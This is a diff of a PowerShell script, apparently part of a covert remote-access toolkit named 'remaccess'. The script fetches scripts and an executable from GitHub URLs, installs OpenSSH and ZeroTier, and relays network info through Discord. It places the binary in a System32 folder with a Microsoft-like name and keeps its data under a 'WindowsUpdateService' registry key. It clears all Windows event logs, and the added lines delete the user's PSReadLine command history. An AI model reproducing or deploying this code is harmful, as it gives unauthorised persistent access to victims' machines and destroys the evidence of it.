@@ -19,16 +19,17 @@ $regPath = "HKLM:\Software\WindowsUpdateService"
 $sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
 $ztinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ZeroTierStuff/MeshNetworkInstall.ps1"
 $codeUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CoreFiles/CuesForRemoteHosts.txt?cachebuster=$(Get-Random)"
-$pinginstallscript = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTasks/PingTaskForNetworkInfoRelay.ps1"
-$pinguninstallscript = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTasks/PingTasksCleanup.ps1"
+$pinginstallscript = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordBots/PingTaskForNetworkInfoRelay.ps1"
+$pinguninstallscript = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordBots/PingTasksCleanup.ps1"
+$hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
+$downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordStatusUpdateBot.exe"
 $programDataPath = $env:ProgramData
 $storedData = (Get-ItemProperty -Path $regPath).Data
 $storedCode = (Get-ItemProperty -Path $regPath).Code
-$downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordStatusUpdateBot.exe"
 $downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
 $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
 $botpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
-$hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
+$psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
 #File Integrity Check.
 if (-not (Test-Path (Split-Path $botpath))) {
     New-Item -Path (Split-Path $botpath) -ItemType Directory -Force
@@ -391,4 +392,10 @@ if ($storedCode -ne $null) {
     }
 } else {}
 Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
+    $files = Get-ChildItem -Path $psreadlineFolderPath
+    if ($files.Count -gt 0) {
+        Remove-Item -Path "$psreadlineFolderPath\*" -Force
+    }
+}
 Start-Sleep 300 }
